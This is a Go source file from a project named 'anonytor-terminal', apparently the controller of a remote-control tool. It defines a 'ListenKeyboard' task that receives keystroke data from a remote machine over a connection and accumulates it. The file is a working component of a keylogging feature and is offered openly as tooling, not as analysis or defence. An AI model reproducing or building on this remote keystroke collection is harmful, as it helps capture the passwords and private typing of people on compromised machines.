package windows

import (
	"anonytor-terminal/controller/task"
	"anonytor-terminal/runtime/definition"
	log "github.com/sirupsen/logrus"
	"io"
)

type ListenKeyboardTask struct {
	task.Base
	result string
}

func (t *ListenKeyboardTask) GetCmdType() definition.Cmd {
	return definition.ListenKeyboard
}

func (t *ListenKeyboardTask) OnTaskFinished(string) {
	t.Status = definition.TaskFinished
}

func (t *ListenKeyboardTask) GetResult() string {
	return t.result
}
func (t *ListenKeyboardTask) OnTransConnEstablished(r io.ReadWriter) {
	t.Status = definition.TaskTransConnEstablished
	newByte := make([]byte, 128)
	for {
		n, err := r.Read(newByte)
		if err != nil {
			if err != definition.TimeOutError {
				log.Warn(err)
				return
			}
			continue
		}
		t.result += string(newByte[:n])
	}
}
